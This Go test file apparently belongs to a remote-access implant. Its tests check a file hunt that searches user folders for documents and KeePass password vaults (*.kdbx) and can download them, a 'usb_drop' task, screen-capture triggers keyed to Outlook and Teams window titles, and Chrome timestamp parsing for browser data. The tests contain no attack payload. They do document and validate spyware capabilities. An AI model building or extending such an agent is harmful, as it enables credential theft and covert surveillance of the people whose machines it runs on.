//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestMatchHuntName(t *testing.T) {
	pats := []string{"*.docx", "*.kdbx"}
	if !matchHuntName("report.docx", pats) {
		t.Fatal("expected docx match")
	}
	if matchHuntName("report.exe", pats) {
		t.Fatal("exe should not match office globs")
	}
	if !matchHuntName("secret.KDBX", pats) {
		t.Fatal("expected case-insensitive glob")
	}
	if !matchHuntName("notes.txt", []string{"note"}) {
		t.Fatal("substring match without glob chars")
	}
}

func TestSkipHuntDir(t *testing.T) {
	if !skipHuntDir("node_modules") || !skipHuntDir(".git") || !skipHuntDir("Windows") {
		t.Fatal("expected well-known skip dirs")
	}
	if skipHuntDir("Documents") {
		t.Fatal("Documents must not be skipped")
	}
}

func TestParseHuntOptsDefaults(t *testing.T) {
	opts := parseHuntOpts("", "", "")
	if opts.maxFiles != huntDefaultMaxFiles {
		t.Fatalf("root=%q files=%d", opts.root, opts.maxFiles)
	}
	if len(opts.patterns) == 0 {
		t.Fatal("expected default patterns")
	}
	opts = parseHuntOpts("/tmp", "*.pdf", "max_files=9999,download=1,max_depth=99,max_bytes=999999999")
	if opts.maxFiles != huntHardMaxFiles {
		t.Fatalf("maxFiles cap = %d", opts.maxFiles)
	}
	if opts.maxDepth != huntHardMaxDepth {
		t.Fatalf("maxDepth cap = %d", opts.maxDepth)
	}
	if opts.maxBytes != huntHardMaxBytes {
		t.Fatalf("maxBytes cap = %d", opts.maxBytes)
	}
	if !opts.download {
		t.Fatal("expected download=1")
	}
	if opts.root != "/tmp" {
		t.Fatalf("root=%q", opts.root)
	}
}

func TestRunFileHuntCapped(t *testing.T) {
	dir := t.TempDir()
	for i := 0; i < 8; i++ {
		name := filepath.Join(dir, "f"+string(rune('a'+i))+".txt")
		if err := os.WriteFile(name, []byte("x"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Mkdir(filepath.Join(dir, "node_modules"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "node_modules", "skip.txt"), []byte("no"), 0o600); err != nil {
		t.Fatal(err)
	}
	out, err := runFileHunt(huntOpts{
		root:     dir,
		patterns: []string{"*.txt"},
		maxFiles: 3,
		maxDepth: 4,
		maxBytes: 1024,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "truncated=true") {
		t.Fatalf("expected truncation, got:\n%s", out)
	}
	if strings.Contains(out, "node_modules") {
		t.Fatal("walk entered skipped dir")
	}
}

func TestHandleUSBDropRequiresPath(t *testing.T) {
	var res TaskResult
	handleUSBDrop(Task{Type: "usb_drop"}, &res)
	if res.Error == "" || !strings.Contains(res.Error, "source path required") {
		t.Fatalf("error=%q", res.Error)
	}
}

func TestParseScreenTriggerArgs(t *testing.T) {
	_, _, err := parseScreenTriggerArgs("")
	if err == nil {
		t.Fatal("empty match must fail")
	}
	m, iv, err := parseScreenTriggerArgs("Outlook")
	if err != nil || m != "Outlook" || iv != 5 {
		t.Fatalf("got %q %d %v", m, iv, err)
	}
	m, iv, err = parseScreenTriggerArgs("Microsoft Teams,3")
	if err != nil || m != "Microsoft Teams" || iv != 3 {
		t.Fatalf("got %q %d %v", m, iv, err)
	}
	if !titleMatchesTrigger("Inbox - Outlook", "outlook") {
		t.Fatal("expected case-insensitive title match")
	}
	if titleMatchesTrigger("Notepad", "outlook") {
		t.Fatal("unexpected match")
	}
}

func TestChromeTimeToTime(t *testing.T) {
	// 2020-01-01 00:00:00 UTC in Chrome microseconds.
	us := int64((1577836800 + 11644473600) * 1e6)
	got := chromeTimeToTime(us)
	if got.Year() != 2020 || got.Month() != 1 || got.Day() != 1 {
		t.Fatalf("got %s", got)
	}
	if !chromeTimeToTime(0).IsZero() {
		t.Fatal("zero chrome time")
	}
}
